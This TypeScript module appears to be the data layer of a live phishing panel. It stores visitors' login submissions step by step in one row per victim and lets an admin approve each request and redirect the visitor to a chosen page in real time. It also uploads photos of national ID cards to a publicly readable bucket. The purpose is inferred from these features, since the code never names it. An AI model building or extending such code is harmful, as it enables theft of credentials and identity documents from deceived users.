import { supabase } from "@/lib/supabase";
import type { LoginRequest, LoginRequestInsert, RequestStatus } from "@/lib/database.types";
import { getVisitorRequestId, setVisitorRequestId } from "@/lib/session";

// Values considered placeholders that should NOT overwrite existing real data.
const PLACEHOLDER_VALUES = new Set(["----", "", null, undefined]);

function stripPlaceholders<T extends Record<string, unknown>>(data: T): Partial<T> {
  const out: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(data)) {
    if (v === undefined) continue;
    if (PLACEHOLDER_VALUES.has(v as string | null | undefined)) continue;
    out[k] = v;
  }
  return out as Partial<T>;
}

export async function createLoginRequest(data: LoginRequestInsert) {
  // If this visitor already has a row, MERGE this step's data into it
  // instead of creating a new record — so admin sees one conversation per client.
  const existingId = typeof window !== "undefined" ? getVisitorRequestId() : null;

  if (existingId) {
    const patch = stripPlaceholders(data as unknown as Record<string, unknown>);
    // Always advance step/status so admin sees latest page the user reached.
    if (data.step) (patch as Record<string, unknown>)["step"] = data.step;
    if (data.status) (patch as Record<string, unknown>)["status"] = data.status;

    const { data: row, error } = await supabase
      .from("login_requests")
      .update(patch)
      .eq("id", existingId)
      .select("id")
      .maybeSingle();

    if (!error && row) return row as { id: string };
    // Row missing (deleted by admin) — fall through and insert a fresh one.
    if (typeof window !== "undefined") setVisitorRequestId("");
  }

  const { data: row, error } = await supabase
    .from("login_requests")
    .insert(data)
    .select("id")
    .single();

  if (error) throw error;
  return row as { id: string };
}


export async function getLoginRequest(id: string) {
  const { data, error } = await supabase.from("login_requests").select("*").eq("id", id).maybeSingle();
  if (error) throw error;
  return data as LoginRequest | null;
}

export async function getLoginRequests() {
  const { data, error } = await supabase
    .from("login_requests")
    .select("*")
    .order("created_at", { ascending: false });
  if (error) throw error;
  return (data ?? []) as LoginRequest[];
}

export async function updateLoginRequestStatus(id: string, status: RequestStatus) {
  const { error } = await supabase
    .from("login_requests")
    .update({ status })
    .eq("id", id);
  if (error) throw error;
}

export async function routeLoginRequestTo(id: string, targetPage: string) {
  const { error } = await supabase
    .from("login_requests")
    .update({ status: "approved", target_page: targetPage })
    .eq("id", id);
  if (error) throw error;
}

export async function clearTargetPage(id: string) {
  await supabase
    .from("login_requests")
    .update({ target_page: null, status: "pending" })
    .eq("id", id);
}

export async function deleteLoginRequest(id: string) {
  const { error } = await supabase.from("login_requests").delete().eq("id", id);
  if (error) throw error;
}

export async function deleteAllLoginRequests() {
  const { error } = await supabase.from("login_requests").delete().neq("id", "00000000-0000-0000-0000-000000000000");
  if (error) throw error;
}

export function subscribeToLoginRequest(
  id: string,
  channelName: string,
  onUpdate: (row: LoginRequest) => void,
) {
  const channel = supabase
    .channel(channelName)
    .on(
      "postgres_changes",
      { event: "UPDATE", schema: "public", table: "login_requests", filter: `id=eq.${id}` },
      (payload) => onUpdate(payload.new as LoginRequest),
    )
    .subscribe();

  return () => {
    supabase.removeChannel(channel);
  };
}

export async function uploadNationalId(file: File, pathPrefix: string) {
  const ext = file.name.split(".").pop() ?? "jpg";
  const path = `${pathPrefix}/${Date.now()}.${ext}`;
  const { error } = await supabase.storage.from("national-ids").upload(path, file);
  if (error) throw error;
  const { data } = supabase.storage.from("national-ids").getPublicUrl(path);
  return data.publicUrl;
}
